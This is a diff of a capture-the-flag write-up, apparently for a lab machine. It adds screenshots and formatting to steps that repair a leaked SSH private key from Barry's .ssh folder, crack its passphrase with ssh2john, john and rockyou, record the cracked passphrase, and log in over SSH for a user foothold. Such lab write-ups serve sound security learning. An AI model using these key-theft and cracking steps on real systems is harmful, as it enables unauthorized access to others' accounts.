@@ -151,22 +151,32 @@ pY8rMoBXqgm9hC5JsXzn6Z6X1kpGFhDjkNSdzx4jYzw=
 - Ensured there are no leading or trailing spaces around the Base64 content.
 - Properly wrapped lines to fit PEM requirements (64 characters per line max).
 ```
+</br> proper formatting for RSA keys may more easily be visible through the inspector if there is a client-side leak, such as shown in screencap
+![propFormatNotOnONeLine](https://github.com/user-attachments/assets/5e7104eb-6bb2-4056-8ea7-d103680e59d3)
+
+</br> initial part of proper format (important to understand this visual)
+![propFormatNotOnONeLine](https://github.com/user-attachments/assets/4e7bd2e2-1213-4063-a79c-37dbf9246f04)
+![properFormatHeader](https://github.com/user-attachments/assets/454863ba-b1c2-4d2a-9ac5-e521f77672ba)
+</br> and that's the proper ending tag as well.
 
 </br>There, now I can use the file, saving the text in nano as "eee" (arbitrary filename
 
 </br>convert it to a hash
-</br>/opt/john/ssh2john.py eee > out.txt
+</br>`/opt/john/ssh2john.py eee > out.txt`
 
 </br>plug the freshly made hash into john to rip it with the rockyou wordlist
-</br>john out.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</br>`john out.txt --wordlist=/usr/share/wordlists/rockyou.txt`
+![import23t23t](https://github.com/user-attachments/assets/602c41fa-3855-4791-9125-35d982b33e86)
 
-</br>urieljames (connected to the rsakey in eee)
+</br> the credential: urieljames is connected to the rsakey in eee, which was for that Barry account that we got from the leak by looking into /home/Barry/.ssh
 
 </br>give execute ermissions to rsa key so we can use it to ssh into the user
 </br>chmod 600 eee
 
 </br>ssh into the target
 </br>ssh -i eee barry@10.10.215.126
+</br> this gives us a user foothold
+![getUserfootholdCantSudo](https://github.com/user-attachments/assets/8b289996-6fbf-4b9b-b4ab-adea266b187c)
 
 </br>sadly, we can't see stuff with sudo -l
 </br>
